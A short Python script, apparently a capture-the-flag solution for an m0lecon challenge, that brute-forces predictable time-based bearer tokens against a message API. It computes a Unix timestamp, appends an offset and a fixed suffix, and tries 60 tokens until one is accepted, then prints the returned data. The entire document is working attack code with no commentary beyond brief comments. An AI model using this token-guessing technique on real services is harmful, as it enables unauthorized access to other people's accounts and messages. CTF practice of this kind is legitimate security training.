#!/usr/bin/env python3

from datetime import datetime, timezone
import requests

#obtain the unix epoch
dt = datetime(2026,4,15,21,46,tzinfo=timezone.utc)
timestp = dt.timestamp()
print(timestp)

#establish the session
url = "http://f92d5383-0357-49cb-affc-c343a6753001.offsec.m0lecon.it:8001/api/messages/1"
s = requests.Session()

for i in range(1,61):
    print(f"Attempt no. {i}")
    token = int(str(int(timestp) + i) + '001')
    
    #make the request
    headers = {'Authorization': f'Bearer {token}'}
    r = s.get(url, headers=headers)
    if r.status_code != 401:
        print(r.json())
        break
        

    